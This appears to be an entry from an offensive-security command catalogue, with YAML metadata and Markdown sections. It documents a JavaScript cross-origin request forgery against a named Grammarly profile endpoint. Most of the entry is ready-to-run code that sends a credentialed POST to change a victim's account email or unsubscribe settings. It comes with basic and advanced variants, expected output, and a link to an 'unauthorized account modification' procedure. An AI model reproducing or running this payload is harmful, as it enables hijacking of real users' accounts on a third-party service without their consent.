---
id: cmd-js-post-modify
data: >-
  var xhttp = new XMLHttpRequest(); var data = new FormData();
  data.append("email", "example@email.com"); data.append("unsubscribe",
  "false"); xhttp.open("POST", "https://g-mail.grammarly.com/profile", true);
  xhttp.withCredentials = true; xhttp.send(data);
tags:
  - cors
  - account-modification
type: command
output: Success response indicating updated preferences
executor: javascript
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:27:57.758Z'
verified: false
validated: true
submitted: true
---
# javascript-post-profile-modify

## Command

```javascript
var xhttp = new XMLHttpRequest(); var data = new FormData(); data.append("email", "example@email.com"); data.append("unsubscribe", "false"); xhttp.open("POST", "https://g-mail.grammarly.com/profile", true); xhttp.withCredentials = true; xhttp.send(data);
```

## Description

This JavaScript command uses XMLHttpRequest and FormData to send a cross-origin POST to the Grammarly profile endpoint, modifying settings like email or unsubscribe without CSRF validation, via spoofed CORS.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| url | Target endpoint (https://g-mail.grammarly.com/profile) | Yes |
| data | FormData object with fields (e.g., email, unsubscribe) | Yes |
| withCredentials | Include session cookies (true) | Yes |

## Examples

### Basic Usage

```javascript
var xhttp = new XMLHttpRequest(); var data = new FormData(); data.append("unsubscribe", "true"); xhttp.open("POST", "https://g-mail.grammarly.com/profile", true); xhttp.withCredentials = true; xhttp.send(data);
```

### Advanced Usage

Add callback for confirmation:

```javascript
var xhttp = new XMLHttpRequest(); var data = new FormData(); data.append("email", "new@example.com"); xhttp.onreadystatechange = function() { if (this.readyState == 4) { console.log(this.responseText); } }; xhttp.open("POST", "https://g-mail.grammarly.com/profile", true); xhttp.withCredentials = true; xhttp.send(data);
```

## Expected Output

HTTP 200 response with success message or empty body confirming the update to profile settings.

## Related

- [[commands/javascript-get-profile-data]]
- [[procedures/Cross-Origin-POST-Request-for-Unauthorized-Account-Modification]]
